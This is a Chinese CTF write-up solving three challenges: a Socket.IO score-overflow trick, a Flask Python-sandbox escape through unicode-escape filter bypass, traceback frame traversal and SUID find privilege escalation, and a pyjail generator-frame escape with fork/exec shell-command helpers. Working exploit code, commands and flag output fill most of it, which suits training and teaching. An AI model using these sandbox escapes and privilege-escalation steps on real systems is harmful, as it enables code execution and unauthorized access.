## GuessOneGuess-Web

签到题

后端关键代码

```javascript
module.exports = function(io) {
    io.on('connection', (socket) => {
        let targetNumber = Math.floor(Math.random() * 100) + 1;
        let guessCount = 0;
        let totalScore = 0;
        const FLAG = process.env.FLAG || "miniL{THIS_IS_THE_FLAG}";
        console.log(`新连接 - 目标数字: ${targetNumber}`);
        
        socket.emit('game-message', {
            type: 'welcome',
            message: '猜一个1-100之间的数字！',
            score: totalScore
        });
        
        socket.on('guess', (data) => {
            try {
              console.log(totalScore);
                const guess = parseInt(data.value);

                if (isNaN(guess)) {
                    throw new Error('请输入有效数字');
                }

                if (guess < 1 || guess > 100) {
                    throw new Error('请输入1-100之间的数字');
                }

                guessCount++;

                if (guess === targetNumber) {
                    const currentScore = Math.floor(100 / Math.pow(2, guessCount - 1));
                    totalScore += currentScore;

                    let message = `🎉 猜对了！得分 +${currentScore} (总分数: ${totalScore})`;
                    let showFlag = false;

                    if (totalScore > 1.7976931348623157e308) {
                        message += `\n🏴 ${FLAG}`;
                        showFlag = true;
                    }

                    socket.emit('game-message', {
                        type: 'result',
                        win: true,
                        message: message,
                        score: totalScore,
                        showFlag: showFlag,
                        currentScore: currentScore
                    });
                    
                    targetNumber = Math.floor(Math.random() * 100) + 1;
                    console.log(`新目标数字: ${targetNumber}`);
                    guessCount = 0;
                } else {
                    if (guessCount >= 100) {
                      console.log("100次未猜中！将扣除当前分数并重置");
                        socket.emit('punishment', {
                            message: "100次未猜中！将扣除当前分数并重置",
                        });
                        return;
                    }
                    socket.emit('game-message', {
                        type: 'result',
                        win: false,
                        message: guess < targetNumber ? '太小了！' : '太大了！',
                        score: totalScore
                    });
                }
            } catch (err) {
                socket.emit('game-message', {
                    type: 'error',
                    message: err.message,
                    score: totalScore
                });
            }
        });
        socket.on('punishment-response', (data) => {
            console.log(data.score);
          totalScore -= data.score;
          console.log(totalScore);
          guessCount = 0;
          targetNumber = Math.floor(Math.random() * 100) + 1;
          console.log(`新目标数字: ${targetNumber}`);
          socket.emit('game-message', {
            type: 'result',
            win: true,
            message: "扣除分数并重置",
            score: totalScore,
            showFlag: false,
          });

        });
    });
};
```

分数要大于`1.7976931348623157e308`才会给flag这个数恰恰是js中`Number.MAX_VALUE`，但是如果超过这个值就会变成`Infinity`，只有`Infinity>Number.MAX_VALUE`才是`true`，

后端监听的`'punishment-response'`执行`totalScore -= data.score;`，而data是前端可控的，

但是直接`socket.emit('punishment-response', {  score: -1.8e308 });`只要这个数大于`Number.MAX_VALUE`（我们这里称为`Infinity`）,实际就是`socket.emit('punishment-response', {  score: -Infinity });`会失败，原因是

Socket.IO 在传输数据时使用的是 JSON 序列化。如果值是 `Infinity`、`-Infinity` 或 `NaN`，这些是 **不能被 JSON 表示的**，会被序列化成 `null`

`JSON.stringify({ score: -Infinity }); // '{"score":null}'`所以得让Socket.IO传输的时候正常传（不被序列化为无效值）

这里的解决办法是`{  score: "-Infinity" }`（字符串）或者发`-1e308`（小于`Number.MAX_VALUE`）多发几次后端一运算还是`Infinity`

```js
socket = io();
//socket.emit('punishment-response', {
//  score: "-Infinity"
//});或者下面的
socket.emit('punishment-response', {
  score: -1e308
});
socket.emit('punishment-response', {
  score: -1e308
});
//猜对这里可二分法猜,手试二分法也ok,其实for循环爆也型
for(var i=0;i<100;i++)
 socket.emit('guess', {
   value: i
 });
 socket.on(
   'game-message',
   (data) => {
     console.log(data.message);
   });
```

塞控制台运行

这题的关键还是`Socket.IO`传输将`-Infinity`系列化为`null`，可能会有人卡在这懵逼

## PyBox-Web

进去直接给源码

```python
from flask import Flask, request, Response
import multiprocessing
import sys
import io
import ast

app = Flask(__name__)

class SandboxVisitor(ast.NodeVisitor):
    forbidden_attrs = {
        "__class__", "__dict__", "__bases__", "__mro__", "__subclasses__",
        "__globals__", "__code__", "__closure__", "__func__", "__self__",
        "__module__", "__import__", "__builtins__", "__base__"
    }
    def visit_Attribute(self, node):
        if isinstance(node.attr, str) and node.attr in self.forbidden_attrs:
            raise ValueError
        self.generic_visit(node)
    def visit_GeneratorExp(self, node):
        raise ValueError
def sandbox_executor(code, result_queue):
    safe_builtins = {
        "print": print,
        "filter": filter,
        "list": list,
        "len": len,
        "addaudithook": sys.addaudithook,
        "Exception": Exception
    }
    safe_globals = {"__builtins__": safe_builtins}

    sys.stdout = io.StringIO()
    sys.stderr = io.StringIO()

    try:
        exec(code, safe_globals)
        output = sys.stdout.getvalue()
        error = sys.stderr.getvalue()
        result_queue.put(("ok", output or error))
    except Exception as e:
        result_queue.put(("err", str(e)))

def safe_exec(code: str, timeout=1):
    code = code.encode().decode('unicode_escape')
    tree = ast.parse(code)
    SandboxVisitor().visit(tree)
    result_queue = multiprocessing.Queue()
    p = multiprocessing.Process(target=sandbox_executor, args=(code, result_queue))
    p.start()
    p.join(timeout=timeout)

    if p.is_alive():
        p.terminate()
        return "Timeout: code took too long to run."

    try:
        status, output = result_queue.get_nowait()
        return output if status == "ok" else f"Error: {output}"
    except:
        return "Error: no output from sandbox."

CODE = """
def my_audit_checker(event,args):
    allowed_events = ["import", "time.sleep", "builtins.input", "builtins.input/result"]
    if not list(filter(lambda x: event == x, allowed_events)):
        raise Exception
    if len(args) > 0:
        raise Exception

addaudithook(my_audit_checker)
print("{}")

"""
badchars = "\"'|&`+-*/()[]{}_."

@app.route('/')
def index():
    return open(__file__, 'r').read()

@app.route('/execute',methods=['POST'])
def execute():
    text = request.form['text']
    for char in badchars:
        if char in text:
            return Response("Error", status=400)
    output=safe_exec(CODE.format(text))
    if len(output)>5:
        return Response("Error", status=400)
    return Response(output, status=200)


if __name__ == '__main__':
    app.run(host='0.0.0.0')
```

`CODE.format(text)`将`text`替换到`{}`，等价于`print("text")`

```
text=")
#这里执行代码
print("
```

就可以执行代码了，然后要绕`badchars`，`safe_exec`中`code = code.encode().decode('unicode_escape')`

unicode_escape会解析 Unicode 转义序列，只需要**将text的值unicode编码**，在safe_exec中就会还原回原字符（就是编码解码不一致还是在badchar后解的码）

然后就是审计钩子的绕过，就很简单一查就有强网杯的题，**重写list与len方法就行**

然后就是ast的绕过，禁止了**生成器**与一些**魔术属性与方法**，然后就不能生成器栈帧逃逸与继承链应该也不太行的通

提升跟Exception有关，一查应该都能查出来，**异常栈帧逃逸**(有很多方法吧，我觉得这个最好查？所以提升给了可能？)

```
try:
    1/0
except Exception as e:
    frame = e.__traceback__.tb_frame.f_back
    builtins = frame.f_globals['__builtins__']
```

`e.__traceback__` → 指向异常发生时的 **traceback** 对象

traceback 里包含 `tb_frame` → 指向异常发生的 **栈帧 frame 对象**

frame 里包含 `f_locals`、`f_globals`、`f_back` → 可以沿着链条访问之前的局部变量、全局变量、调用栈

可以逃逸到exec外的全局拿`__builtins__`

```python
text=")
list=lambda x:True
len=lambda x:False

try:
    1/0
except Exception as e:
    frame = e.__traceback__.tb_frame.f_back
    builtins = frame.f_globals['__builtins__']
    builtins.exec("builtins.__import__('os').system('ls / -al>app.py')")    #这里__import__被act拦了，所以放成字符串丢到exec里（也可以用__getattribute__获取__import__）
    #frame.f_globals['SandboxVisitor'].visit_Attribute=lambda x,y:None  #重写visit_Attribute后
    #builtins.__import__('os').system('ls />app.py') 					#也ok
print("

#得unicode编码
```

还有很多其他做法，比如\_\_getattribute\_\_绕，yeild关键字构造生成器,  闭包栈帧逃逸， _\_newobj\_\_的\_\_builtins\_\_属性，这题相比pyjail比较开放，网上查查应该都能查出来

因为有len(output)<=5限制，可以当没回显来打(写app.py或者创建static目录往里写)，也可以一点一点读

然后当前用户minilUser没权限读/m1n1FL@G，需要提权，很简单suid提权，24级的网安导论实验也有这内容

查看entrypoint.sh就可以知道了find有suid权限，也可以`find / -perm -4000 -type f 2>/dev/null`

```bash
#!/bin/sh

echo $FLAG > /m1n1FL@G
echo "\nNext, let's tackle the more challenging misc/pyjail">> /m1n1FL@G
chmod 600 /m1n1FL@G
chown root:root /m1n1FL@G

chmod 4755 /usr/bin/find

useradd -m minilUser
export FLAG=""
chmod -R 777 /app
su minilUser -c "python /app/app.py"
```

然后`find . -exec cat /m1* \; >app.py`

## PyJail-Misc

```python
import socketserver
import sys
import ast
import io

with open(__file__, "r", encoding="utf-8") as f:
    source_code = f.read()

class SandboxVisitor(ast.NodeVisitor):
    def visit_Attribute(self, node):
        if isinstance(node.attr, str) and node.attr.startswith("__"):
            raise ValueError("Access to private attributes is not allowed")
        self.generic_visit(node)

def safe_exec(code: str, sandbox_globals=None):
    original_stdout = sys.stdout
    original_stderr = sys.stderr

    sys.stdout = io.StringIO()
    sys.stderr = io.StringIO()

    if sandbox_globals is None:
        sandbox_globals = {
            "__builtins__": {
                "print": print,
                "any": any,
                "len": len,
                "RuntimeError": RuntimeError,
                "addaudithook": sys.addaudithook,
                "original_stdout": original_stdout,
                "original_stderr": original_stderr
            }
        }

    try:
        tree = ast.parse(code)
        SandboxVisitor().visit(tree)

        exec(code, sandbox_globals)
        output = sys.stdout.getvalue()

        sys.stdout = original_stdout
        sys.stderr = original_stderr

        return output, sandbox_globals
    except Exception as e:
        sys.stdout = original_stdout
        sys.stderr = original_stderr
        return f"Error: {str(e)}", sandbox_globals


CODE = """
def my_audit_checker(event, args):
    blocked_events = [
        "import", "time.sleep", "builtins.input", "builtins.input/result", "open", "os.system",
         "eval","subprocess.Popen", "subprocess.call", "subprocess.run", "subprocess.check_output"
    ]
    if event in blocked_events or event.startswith("subprocess."):
        raise RuntimeError(f"Operation not allowed: {event}")

addaudithook(my_audit_checker)

"""


class Handler(socketserver.BaseRequestHandler):
    def handle(self):
        self.request.sendall(b"Welcome to Interactive Pyjail!\n")
        self.request.sendall(b"Rules: No import / No sleep / No input\n\n")

        try:
            self.request.sendall(b"========= Server Source Code =========\n")
            self.request.sendall(source_code.encode() + b"\n")
            self.request.sendall(b"========= End of Source Code =========\n\n")
        except Exception as e:
            self.request.sendall(b"Failed to load source code.\n")
            self.request.sendall(str(e).encode() + b"\n")

        self.request.sendall(b"Type your code line by line. Type 'exit' to quit.\n\n")

        prefix_code = CODE
        sandbox_globals = None

        while True:
            self.request.sendall(b">>> ")
            try:
                user_input = self.request.recv(4096).decode().strip()
                if not user_input:
                    continue
                if user_input.lower() == "exit":
                    self.request.sendall(b"Bye!\n")
                    break
                if len(user_input) > 100:
                    self.request.sendall(b"Input too long (max 100 chars)!\n")
                    continue

                full_code = prefix_code + user_input + "\n"
                prefix_code = ""

                result, sandbox_globals = safe_exec(full_code, sandbox_globals)
                self.request.sendall(result.encode() + b"\n")
            except Exception as e:
                self.request.sendall(f"Error occurred: {str(e)}\n".encode())
                break


if __name__ == "__main__":
    HOST, PORT = "0.0.0.0", 5000
    with socketserver.ThreadingTCPServer((HOST, PORT), Handler) as server:
        print(f"Server listening on {HOST}:{PORT}")
        server.serve_forever()
```

生成器栈帧逃逸： https://www.cnblogs.com/gaorenyusi/p/18242719

拿到exec外部globals, 然后重写visit_Attribute

os模块没ban完就ban了最常见的system,popen

回显因为有"original_stdout": original_stdout很容易读出来

长度100限制只需将代码写成`exec("code")`, code部分拼接就行

然后flag.txt告诉flag最后修改时间2025.5.1 find找就行了（或者直接看start.sh能看到flag在哪）flag位置：`/tmp/.\x0a\x0b\x00hidden/flagD`

`cat /tmp/.*/flagD`就行

```python
>>> a = (a.gi_frame.f_back.f_back for i in [1])

>>> a = [x for x in a][0]

>>> globals = a.f_back.f_back.f_globals

>>> globals['SandboxVisitor'].visit_Attribute=lambda x,y:None

>>> os=globals["__builtins__"].__import__("os")

>>> sys=globals["__builtins__"].__import__("sys")

>>> iter=globals["__builtins__"].iter

>>> exec=globals["__builtins__"].exec

>>> a='run_command = lambda cmd: ((lambda r, w, pid: ((pid == 0 and (os.close(r), os.dup2(w,'

>>> a+='original_stdout.fileno()),os.dup2(w, original_stdout.fileno()),os.execlp("/bin/sh", "sh"'

>>> a+=', "-c", cmd) )) or (os.close(w), (output :=b"".join(iter(lambda: os.read(r, 4096), b""))'

>>> a+='.decode()),os.close(r), os.waitpid(pid, 0),output )[4] ))(*os.pipe(), os.fork()))'

>>> exec(a)

>>> print(run_command("find / -type f -newermt '2025-05-01 00:00:00' ! -newermt '2025-05-02 00:00:00'"))
/tmp/.\x0a\x0b\x00hidden/flagD

>>> print(run_command('cat /tmp/.*/flagD'))
miniLCTF{Fl4G-GeNER4ted_In_M1niIctf2OZS_with_IOvE286}
```

这里实际run_command就是

```python
import os
import sys

run_command = lambda cmd: (
    (lambda r, w, pid: (
        (pid == 0 and (
            os.close(r),
            os.dup2(w, sys.stdout.fileno()),
            os.dup2(w, sys.stderr.fileno()),
            os.execlp("/bin/sh", "sh", "-c", cmd)
        )) or (
            os.close(w),
            (output := b"".join(iter(lambda: os.read(r, 4096), b"")).decode()),
            os.close(r),
            os.waitpid(pid, 0),
            output
        )[4]
    ))(*os.pipe(), os.fork())
)

print(run_command("ls"))
```

还可以用其他底层的os函数

比如os.execvp os.forkpty os.spawn可以自己试试

```python
import os
import sys

def run_command(cmd):
    r, w = os.pipe()
    pid = os.fork()
    if pid == 0:
        os.close(r)
        os.dup2(w, 1)
        os.dup2(w, 2)
        os.close(w)
        os.execvp("/bin/sh", ["/bin/sh", "-c", cmd])
        os._exit(1)
    else:
        os.close(w)
        with os.fdopen(r) as f:
            output = f.read()
        os.waitpid(pid, 0)
        return output

print(run_command("ls -l"))



import os

def run_command(cmd):
    pid, fd = os.forkpty()
    if pid == 0:
        os.execvp("sh", ["sh", "-c", cmd])
    else:
        output = b''
        while True:
            try:
                data = os.read(fd, 1024)
                if not data:
                    break
                output += data
            except OSError:
                break
        os.waitpid(pid, 0)
        return output.decode()

print(run_command("ls -l"))
```

